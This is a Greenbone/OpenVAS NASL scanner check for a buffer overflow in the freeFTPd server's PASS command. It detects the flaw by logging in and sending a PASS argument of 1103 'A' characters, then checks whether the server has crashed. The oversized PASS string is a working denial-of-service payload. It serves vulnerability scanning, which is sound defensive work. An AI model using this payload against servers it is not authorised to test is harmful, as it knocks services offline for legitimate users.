# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803747");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-08-22 16:55:03 +0530 (Thu, 22 Aug 2013)");
  script_name("freeFTPD PASS Command Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"FreeFTPD Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted FTP request and check server is dead or not.");

  script_tag(name:"solution", value:"Upgrade to freeFTPd version 1.0.12 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"insight", value:"The flaw is due to an improper handling of huge data in the 'PASS'
  command.");

  script_tag(name:"affected", value:"freeFTPd version 1.0.10 and prior.");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to crash an affected server,
  effectively denying service to legitimate users.");

  script_xref(name:"URL", value:"http://1337day.com/exploits/21139");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27747/");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/freeftpd-1010-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/free_ftpd/detected");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "I'm freeFTPd" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

banner = ftp_recv_line(socket:soc);
if(!banner || "I'm freeFTPd" >!< banner) {
  ftp_close(socket:soc);
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];

ftp_send_cmd(socket:soc, cmd:"USER " + user);
ftp_send_cmd(socket:soc, cmd:"PASS " + crap(length:1103, data:"A"));

close(soc);

soc2 = open_sock_tcp(ftpPort);
if(!soc2){
  security_message(port:ftpPort);
  exit(0);
}

banner = recv(socket:soc2, length:512);
ftp_close(socket:soc2);
if(!banner || "I'm freeFTPd" >!< banner){
  security_message(port:ftpPort);
  exit(0);
}
